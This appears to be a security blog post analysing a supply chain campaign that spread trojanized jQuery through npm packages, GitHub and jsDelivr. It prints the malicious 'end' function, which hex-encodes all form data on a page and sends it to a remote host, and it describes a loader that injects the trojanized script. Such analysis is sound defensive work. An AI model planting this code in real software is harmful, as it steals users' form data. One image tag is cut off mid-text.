        <div class="gh-content gh-canvas">
            <p>Since May 26, 2024, Phylum has been monitoring a persistent supply chain attacker involving a trojanized version of jQuery. We initially discovered the malicious variant on npm, where we saw the compromised version published in dozens of packages over a month. After investigating, we found instances of the trojanized jQuery on other platforms, such as GitHub, and even as a CDN-hosted resource on jsDelivr.</p><h2 id="background">Background</h2><p>This attack stands out due to the high variability across packages. The published packages were relatively minimal, yet the attacker included at least one complete copy of jQuery, often named <code>jquery.min.js</code>, along with other variations such as <code>registration.min.js</code>, <code>icon.min.js</code>, and <code>fontawesome.js</code>. The exfiltration URLs were almost unique for each package, and the attacker published to npm under new usernames. Occasionally, a single user would publish multiple, usually related, packages. Sometimes, the attacker included multiple file versions with different names within the same project. Interestingly, almost every package also contained personal files not typically included in npm publications, such as the npm cache folder, npm logs folder, and a <code>termux.properties</code> file. Overall, this attack is unlike most we've seen at this scale, which typically have a clear, well-defined pattern and an obvious automated aspect. Here, the ad-hoc nature and custom variability of the packages, along with the long timeframe over which they were published, suggest that each package was manually assembled and published.</p><h2 id="the-attack">The Attack</h2><p>Let’s take a closer look at how the attacker trojanized jQuery. As mentioned above, each package contained a copy of jQuery with one small difference—the <code>end</code> function, a part of the jQuery prototype, is modified to include additional malicious code. Here’s that part:</p><pre><code class="language-javascript">end: async function () {
  await $.ajax({
    url: "&lt;https://anti-spam&gt;[.]truex[.]biz[.]id/halo/?cat=" + (function (e) {
      for (var t, n = 0, r = e.length, i = ""; n &lt; r; ++n)
        i += (t = e.charCodeAt(n).toString(16)).length &lt; 2 ? "0" + t : t;
      return i;
    })($("form").serialize()),
    type: "GET",
    dataType: "text",
    headers: { "Content-type": "application/json" },
  });
}

</code></pre><p>According to the <a href="https://api.jquery.com/end/?ref=blog.phylum.io">jQuery docs</a>, the <code>end</code> method is supposed to</p><blockquote><em>End the most recent filtering operation in the current chain and return the set of matched elements to its previous state.</em></blockquote><p>For reference, in the legitimate jQuery source, this is the code for the <code>end</code> method:</p><pre><code class="language-javascript">end: function () {
        return this.prevObject || this.constructor();
      }
</code></pre><p>As advertised, it simply returns the previous object. However, in the malicious code, the attacker is firing off a non-blocking <code>GET</code> request via <code>$.ajax</code> to a remote URL. The URL includes a query parameter (the name of which varies across packages as well) that is constructed by serializing all form data on the page (<code>($("form").serialize())</code>). The serialized data is then encoded into a hex string.</p><p>This means that if you’re using this trojanized version, all form data on the page is exfiltrated any time the <code>end</code> function is called. As far as we can tell, the <code>end</code> function doesn’t appear to be widely used directly. However, looking at the rest of the jQuery library, you’ll notice that the <code>fadeTo</code> method from jQuery’s animation toolkit uses the <code>end</code> method, which is very interesting as <code>fadeTo</code> is far more widely used than <code>end</code>. Here’s the relevant snippet of <code>fadeTo</code>:</p><pre><code class="language-javascript">fadeTo: function (e, t, n, r) {
  return this.filter(ae)
    .css("opacity", 0)
    .show()
    .end()
    .animate({ opacity: t }, e, n, r);
}
</code></pre><h2 id="proliferation-of-the-trojanized-version">Proliferation of the Trojanized Version</h2><p>During our investigation, we also found a user called <code>indexsc</code> on GitHub hosting several versions of the trojanized jQuery file.</p><figure class="kg-card kg-image-card"><img src="https://blog.phylum.io/content/images/2024/07/Screenshot-2024-07-01-at-4.02.05-PM.png" sizes="(min-width: 720px) 720px"></figure><p>Taking a look at the <code>ajax</code> repo:</p><figure class="kg-card kg-image-card"><img src="https://blog.phylum.io/content/images/2024/07/Screenshot-2024-07-01-at-4.02.17-PM.png" class="kg-image" alt="" loading="lazy" width="1321" height="734" sizes="(min-width: 720px) 720px"></figure><p>Both <code>slim.js</code> and <code>all-min.js</code> contain the trojanized version:</p><figure class="kg-card kg-image-card"><img First, it generates a phony warning indicating that the version of Ionicons is deprecated (without even checking what the current version is) and then replaces it with v5.0.0. This is odd because v5.0.0 of Ionicons was released in February 2020. The current version is 7.4.0 and released in May of 2024. After forcing v5.0.0 of ionicons upon the user, it then adds a new script element to the document’s body and sets its source to <code>https://cdn[.]jsdelivr[.]net/gh/indexsc/libs/slim.js</code>. This is also highly suspicious and, unsurprisingly, navigating there reveals that this, too, is the trojanized version:</p><figure class="kg-card kg-image-card"><img src="https://blog.phylum.io/content/images/2024/07/Screenshot-2024-07-03-at-10.55.25-AM.png" class="kg-image" alt="" loading="lazy" width="1129" height="343" srcset="https://blog.phylum.io/content/images/size/w600/2024/07/Screenshot-2024-07-03-at-10.55.25-AM.png 600w, https://blog.phylum.io/content/images/size/w1000/2024/07/Screenshot-2024-07-03-at-10.55.25-AM.png 1000w, https://blog.phylum.io/content/images/2024/07/Screenshot-2024-07-03-at-10.55.25-AM.png 1129w" sizes="(min-width: 720px) 720px"></figure><p>It’s worth noting that jsdelivr constructs these GitHub URLs automatically without needing to upload anything to the CDN explicitly. This is likely an attempt by the attacker to make the source look more legitimate or to sneak through firewalls by using jsdelivr instead of loading the code directly from GitHub itself.</p><h2 id="where-does-that-leave-us">Where Does That Leave Us?</h2><p>To recap, we are witnessing a complex and persistent supply chain attack involving the publication of dozens of packages under multiple npm accounts, each containing a trojanized version of jQuery. The malicious version extracts website form data and sends it to one of many URLs. The attacker has cleverly hidden the malware in the seldom-used <code>end</code> function of jQuery, which is internally called by the more popular <code>fadeTo</code> function from its animation utilities.</p><p>For the malware to be triggered, a user must install one of the malicious packages, use the included trojanized jQuery file, and then invoke either the <code>end</code> function or the <code>fadeTo</code> function. This specific chain of conditions makes it unclear whether this is a highly targeted attack or if the attacker is simply blending in well and randomly affecting users who download and use these packages.</p><p>The sheer number of packages, the variability in naming conventions, and the inclusion of personal files within these packages raise questions about the attacker’s capabilities and intentions. These factors contrast sharply with the more sophisticated nature of the actual malware itself and the effort taken to conceal its maliciousness in plain sight. Despite the narrow set of conditions required to trip the malware, the broad distribution of the packages means the potential impact is wide, potentially affecting many unsuspecting developers. This novel attack exemplifies the rising complexity and potential for the broad reach of supply chain threat actors.</p><h2 id="packages-related-to-this-campaign">Packages Related to This Campaign</h2><table>
